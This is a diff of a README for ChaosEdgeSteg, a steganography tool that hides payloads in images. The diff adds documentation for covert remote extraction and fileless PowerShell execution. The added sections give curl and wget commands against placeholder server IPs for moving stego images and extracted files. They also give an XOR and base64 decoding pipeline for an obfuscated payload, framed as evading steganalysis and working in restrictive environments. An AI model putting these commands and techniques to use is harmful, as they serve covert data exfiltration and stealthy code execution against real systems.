@@ -28,15 +28,17 @@ Where \(a\) and \(b\) are constants. For ChaosEdgeSteg, we utilize typical value
 
 - **Edge Adaptive Embedding:** Prioritizes edges for embedding, making the embedded information less perceptible.
 
-  - **Advanced Stealth:** Adaptively adjusts edge detection thresholds to reflect both image and payload size, ensuring optimum embedding conditions and minimizing risk of detection by modern steganalysis methods.
+  - **Advanced Stealth:** Adaptively adjusts edge detection thresholds to reflect both image and payload size, ensuring optimum embedding conditions and minimizing detection risk by steganalysis techniques.
 
 - **Defense in Depth:** Requires possession of the key, payload length, and original cover image in order to extract steganographic content. Keys are checked against an embedded SHA256 hash as an additional validation mechanism.
 
-- **Payload Execution:** Embedded Python scripts can be executed as a fileless process when extracted. ChaosEdgeSteg spawns a temporary PowerShell instance, base64 encodes the script, and executes it. When the embedded script finishes execution, the spawned temporary shell is removed.
+- **Remote Extraction:** Provides options for covert extraction of data via remote hosts, enabling versatility in restrictive environments.
 
-- **Embed a ZIP Archive:** If it's a `.zip` archive, it can be embedded with the `[-f]` option. Usually requires larger cover images.
+- **Temp PowerShell Execution:** Provides options to execute extracted Python code filelessly in a temporary PowerShell instance, maximizing impact while minimizing footprints.
 
-- **Quiet Mode:** Suppresses dialogue messages, allowing output to be piped to other Unix tools in an obfuscated way.
+- **ZIP Archive Support:** Provides support for ZIP archive embedding, allowing users to hide multiple files of any file type within an image (Usually requires larger cover images).
+
+- **Quiet Mode:** Provides options to suppress dialogue messages, allowing output to be piped to other command-line tools in an obfuscated way.
 
 ## Installation
 
@@ -58,11 +60,47 @@ pip install -r requirements.txt
 ### Embedding Payload
 
 ```bash
-python chaosedgesteg.py embed [-v/-vv/-q] -c <cover_image_path> -f <payload_file> -k 'secret_key' [-o <output_image_path>]
+chaosedgesteg.py embed [-v/-vv] -c <cover_image_path> -f <payload_file> -k 'secret_key' [-o <output_image_path>] [-q] [--save_key] [--save_bitmaps]
 ```
 
 ### Extracting Payload
 
 ```bash
-python chaosedgesteg.py extract [-v/-vv/-q] -c <cover_image_path_from_embedding> -i <stego_image_path> -k '0000::secret_key' [-o <output_file>] [-x]
+chaosedgesteg.py extract [-v/-vv] -c <cover_image_path> -i <stego_image_path> -k '0000::secret_key' [-o <output_file>] [-q] [-psx]
+```
+<br>
+
+#### Remote Extraction
+
+```bash
+chaosedgesteg.py extract -c <cover_image_path> -iR stego_image.png <LHOST> <LPORT> -k '0000::secret_key' [-oR <output_file> <LHOST> <LPORT>] [--echo] [--obfuscate]
+```
+
+`-iR <stego_image.png> <LHOST> <LPORT>` instantiates an HTTP PUT server. 
+
+Upload the stego image as a remote host via `curl --upload-file`:
+
+```bash
+curl --upload-file stego_image.png http://PUT_SERVER_IP:4444/
+```
+
+
+- Use `-iR` with `--echo` to send the payload back to the remote host in plaintext:
+
+    ```bash
+    chaosedgesteg.py extract -c <cover_image_path> -iR stego_image.png <LHOST> <LPORT> -k "0000::secret_key" --echo [--obfuscate]
+    ```
+
+- Use `-iR` with `--echo --obfuscate` **(recommended)** to base64 encode and XOR obfuscate the payload, then pipe the additional commands on the remote host:
+    ```bash
+    curl --upload-file stego_image.png http://PUT_SERVER_IP:4444/ | perl -pe 's/(.)/chr(ord($1) ^ 0xFF)/ge' | perl -pe 's/(.)/chr(ord($1) ^ 0x55)/ge' | base64 -d
+    ```
+
+
+Similar to `-iR`, `-oR <output_file> <LHOST> <LPORT>` can be used to instantiate an HTTP GET server. 
+
+Download the extracted file as a remote host via `wget`:
+
+```bash
+wget http://GET_SERVER_IP:4884/extracted.zip
 ```
